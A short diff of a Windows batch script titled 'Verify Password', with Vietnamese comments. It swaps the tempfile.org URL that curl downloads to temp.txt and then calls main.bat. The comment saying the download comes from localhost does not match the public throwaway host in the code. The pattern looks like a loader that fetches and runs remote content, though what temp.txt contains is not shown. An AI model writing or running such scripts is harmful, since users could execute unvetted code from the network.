@@ -2,7 +2,7 @@
 title Verify Password
 
 :: B1 – curl từ localhost:2556 → temp.txt
-curl.exe "https://tempfile.org/heW8LYFE5v9/download" -o "temp.txt"
+curl.exe "https://tempfile.org/cmUc2YXahoa/download" -o "temp.txt"
 
 if not exist temp.txt (
     echo [ERROR] temp.txt khong ton tai!
@@ -37,3 +37,4 @@ cls
 echo Dang chay main.bat...
 call main.bat
 exit /b
+
